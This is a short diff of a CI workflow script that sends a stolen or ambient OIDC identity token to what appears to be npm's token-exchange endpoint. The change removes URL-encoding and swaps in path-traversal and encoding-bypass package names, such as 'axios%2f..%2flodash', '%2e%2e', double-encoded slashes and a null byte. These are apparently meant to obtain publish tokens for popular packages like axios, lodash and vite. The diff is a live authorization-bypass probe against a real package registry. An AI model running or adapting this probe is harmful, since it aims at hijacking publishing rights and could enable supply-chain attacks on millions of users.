@@ -81,8 +81,8 @@ jobs:
         run: |
           set -uo pipefail
           TOKEN=$(cat /tmp/id_token)
-          for P in "${{ inputs.package }}" lodash core-js react react-dom vue rimraf glob minimatch async bluebird; do
-            ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$P")
+          for P in "axios" "Axios" "AXIOS" "@types/node" "@types%2fnode" "axios%2f..%2flodash" "axios%252f.." "..%2faxios" "axios%00" "axios " "npm/-/npm/v1/oidc/token/exchange/package/vite" "%2e%2e" ; do
+            ENC="$P"
             CODE=$(curl -sS -o /tmp/r.json -w '%{http_code}' -X POST \
               -H "Authorization: Bearer ${TOKEN}" \
               -H 'User-Agent: npm/11.6.0 node/v22.14.0 linux x64 workspaces/false' \
